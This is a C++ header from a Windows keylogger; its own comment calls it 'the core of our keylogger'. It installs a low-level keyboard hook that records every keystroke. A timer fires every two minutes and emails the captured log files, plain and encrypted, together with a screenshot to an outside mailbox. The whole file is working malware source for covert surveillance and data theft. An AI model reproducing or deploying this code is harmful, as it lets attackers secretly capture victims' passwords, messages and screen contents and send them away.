//the core of our keylogger and it will install the hook, and the send email function
#ifndef KEYBHOOK_H
#define KEYBHOOK_H 

#include <iostream>
#include <fstream>
#include <windows.h>
#include "Timer.h"
#include "SendMail.h"
#include "KeysConstants.h"

std::string keylog = "";

void TimerSendMail(){
	if(keylog.empty())
		return ;
	std::string last_fileEn = IO::WriteLogEncrypted(keylog);
	std::string last_file = IO::WriteLog(keylog);

	if(last_file.empty() ||last_fileEn.empty()){
		Helper::WriteAppLog("File Creation was not seccesfull . Keylog '" + keylog +"'");
		return ;
	}
	std::vector<std::string> att ={IO::GetOurPath(true) + last_file,IO::GetOurPath(true) + last_fileEn,IO::GetOurPath(true) + std::string("screen.jpg")};
	int x = Mail::SendMail("Log [" + last_file + "]","Hi, the content: \n Here is the log file and the text file" ,att);
	if(x!=259){
		Helper::WriteAppLog("Mail was not sent! Error code :" + Helper::ToString(x));
	}
	else{
		Helper::WriteAppLog("Mail was sent! Exit code :" + Helper::ToString(x));
		keylog = "";
	}
}

Timer MailTimer(TimerSendMail,120000,Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int ncode, WPARAM wprarm, LPARAM lparam){
	if(ncode < 0)
		CallNextHookEx(eHook,ncode,wprarm,lparam);
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT*) lparam;
	if(wprarm == WM_KEYDOWN || wprarm == WM_SYSKEYDOWN){
		keylog +=Keys::KEYS[kbs->vkCode].Name;
		if(kbs->vkCode == VK_RETURN){
			keylog +='\n';
		}
	}
	else if(wprarm == WM_KEYUP || wprarm == WM_SYSKEYUP){
		DWORD key = kbs->vkCode;
		if(key == VK_CONTROL
			|| key == VK_LCONTROL
			|| key == VK_RCONTROL
			|| key == VK_SHIFT
			|| key == VK_RSHIFT
			|| key == VK_LSHIFT
			|| key == VK_MENU
			|| key == VK_LMENU
			|| key == VK_RMENU
			|| key == VK_CAPITAL
			|| key == VK_LWIN
			|| key == VK_RWIN
			|| key == VK_NUMLOCK){
			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1,"/");
			keylog += KeyName;
		}		
	}
	return CallNextHookEx(eHook,ncode,wprarm,lparam);
}


bool InstallHook()
{
	Helper::WriteAppLog("Hook Started... Timer Started");
	MailTimer.Start(true);

	eHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) OurKeyboardProc,GetModuleHandle(NULL),0);
	return eHook == NULL;	
}

bool UninstallHook(){
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return(bool) b;
}

bool IsHooked(){
	return (bool) (eHook == NULL);
}






#endif